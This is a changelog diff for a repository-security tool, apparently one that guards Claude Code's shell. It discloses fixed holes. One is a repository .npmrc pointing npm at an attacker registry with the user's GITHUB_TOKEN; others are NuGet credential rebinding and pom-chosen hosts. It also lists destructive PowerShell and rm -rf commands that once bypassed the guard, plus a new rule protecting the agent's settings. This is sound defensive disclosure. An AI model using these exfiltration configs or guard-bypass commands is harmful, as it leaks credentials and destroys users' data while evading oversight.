@@ -8,6 +8,76 @@ version bump.
 
 ## [Unreleased]
 
+What the 3.6.1 review left open, each measured before it was closed: a scanned repository's package-manager config
+could still send the user's credentials where it chose, the CI pipelines installed unhashed Python dependencies,
+and the push-run history pass left two kinds of change unread.
+
+### Upgrading from 3.6.1
+
+- **`deps_audit` no longer runs `npm audit` in the repository.** It audits a temporary copy of `package.json` and
+  its lock files, so a repository `.npmrc` / `.pnpmrc` / `.yarnrc` / `.yarnrc.yml` is never read — the result names
+  them in `package_config_not_read`, with the registry the project's `.npmrc` named. A private registry the
+  project needs belongs in your own `~/.npmrc`. A network-path dependency, or a file npm reads that could not be
+  checked for one, makes npm a named gap.
+- **Package managers get an allowlisted environment.** `npm audit`, `pip-audit`, `dotnet restore` and `dotnet list
+  package` (outside `create_fix_pr` too), and `scan_sast`'s .NET restore and build, run with the package managers'
+  allowlist instead of the server's environment: `DOTNET_*`, `NUGET_*`, `NuGetPackageSourceCredentials_*`, `NODE_*`,
+  `PYTHON*` and the home and temp directories pass, a token or a `GUARDIAN_*` variable does not.
+- **A .NET restore can be refused.** A repository `NuGet.config` that declares a feed under a name you hold a
+  credential for, on another server, refuses the restore as a named gap (`nuget_credential_rebound`), and so does a
+  project that keeps `RestoreConfigFile`, `RestoreRootConfigDirectory` or `RestoreSolutionDirectory` with
+  `TreatAsLocalProperty` (`nuget_config_redirected`). Every restore passes those three properties empty.
+- **No .NET SDK telemetry**: every `dotnet` dev-guardian starts runs with `DOTNET_CLI_TELEMETRY_OPTOUT=1` and
+  `DOTNET_NOLOGO=1`, over any value you set.
+- **Trivy scans Maven offline.** Every `trivy fs`-family scan passes `--offline-scan`: a pom's transitive
+  dependencies are not resolved, only its direct ones, and that is a named partial gap (`trivy:maven-offline`)
+  whenever Trivy read a pom. Lock-based ecosystems are unaffected.
+- **CI templates**: regenerate with `ci-init`. The pipelines now install bandit, Semgrep and zizmor into a venv
+  from a lock per Python the images run (`configs/ci/python/requirements-{3.12,3.13,3.14}.txt`, every dependency
+  sha256-hashed, `pip install --require-hashes --only-binary :all:`); an image whose Python has no lock (3.11, say)
+  stops the job, naming it. The old pipelines keep working.
+- **The shell guard asks more**: deleting or moving Claude Code's settings from the shell — the file, a glob that
+  could match it, the `.claude` directory, `git rm`, `find … -delete` — is now a question
+  (`claude-settings-remove`).
+
+### Security
+
+- **`deps_audit` sent the server's token where a repository pointed** (measured on npm 11.20.0): a repository
+  `.npmrc` of `registry=http://<attacker>/` with `_authToken=${GITHUB_TOKEN}` made npm POST the dependency list to
+  the attacker with `Authorization: Bearer <GITHUB_TOKEN>`, and the attacker's `{}` read as a clean audit.
+  pip-audit (pip 26.2.1, a requirements file's index URL) and `dotnet restore` (a `NuGet.config` password of
+  `%GITHUB_TOKEN%`) expanded the same variables. Fixed by the manifest copy and the allowlisted environment above.
+- **NuGet binds a credential to a feed's name, never its URL** (measured on the .NET SDK 10.0.403): a repository
+  `NuGet.config` declaring your feed's name at its own URL received your user name and password, through a
+  `<clear/>` too. Refused before every restore (`scan_sast`, `deps_audit`, `deps_update_plan`, `create_fix_pr`).
+- **A repository's `pom.xml` chose where Trivy fetched** (measured on Trivy 0.74.0): its `<repositories>` or a
+  remote `<parent>` sent every dependency's coordinates to that host, with your `~/.m2/settings.xml` credentials
+  when a `<server>` id matched. Closed by `--offline-scan`.
+- **`scan_sast`'s .NET restore and build ran the project's MSBuild with the server's whole environment** — its
+  `<Exec>` tasks and its packages' analyzers could read a `GITHUB_TOKEN` the server was started with.
+- **The CI pipelines' Python dependencies are hashed**: `pipx install "semgrep==<version>"` pinned three packages
+  and resolved every dependency at job time, after upgrading pipx's own pip from PyPI.
+- **The CI gate's secrets history pass** (on a push, where no full-content pass stands behind it) left unread a
+  file git reads as binary by its content (a NUL byte) and a merge commit's own change (an evil merge): both a
+  one-line AWS key read by no pass, exit 0, measured with gitleaks 8.30.1. Every file is now diffed as text (but a
+  path that held a blob over 1 MiB), and a two-parent merge's own change is a second gitleaks run (`git log --merges
+  --diff-merges=remerge`, git 2.36+); what stays unread — an octopus merge, an older git, the large paths — is
+  named on the run. `docs/ci.md` has the costs measured on Pillow, flask and git.git.
+- **The shell guard** reads a PowerShell `$( … )` inside a double-quoted string or a here-string as PowerShell
+  (`Write-Host "x $(Remove-Item C:\ -Recurse -Force)"` was ok), a braced variable as one word whatever its name
+  holds (`${"}; Remove-Item C:\ …` was ok), and `flock` / `runuser` hand their command on with its quoting intact
+  (`flock /tmp/l bash -c 'rm -rf ~'` was ok).
+- `guardian-deps`' no-server fallback no longer tells you to run `npm audit` inside the repository.
+
+### Fixed
+
+- **Rule packs**, measured on code nobody wrote as a fixture (Semgrep 1.182.0, every corpus recorded by tag or
+  sha256 in `docs/maintainers/ablation.md`): bugfix-go's lock-without-defer skips a return a `defer` Unlock covers
+  (Go 1.27.3 `src/`: 39 → 20 findings, the 19 removed all false); bugfix-js' floating-mutation skips a promise pushed
+  into an array or handed to an assertion (Outline + Uptime Kuma: 6 → 2). Base `py-yaml-load`'s four `BaseLoader`
+  exclusions each have a near-miss fixture (two were `DEAD`).
+- `guardian-performance` fires on "this endpoint takes seconds".
+
 ## [3.6.1] - 2026-10-25
 
 A full review of 3.6.0 — every area read against the code by its own reviewer, each finding reproduced (by a
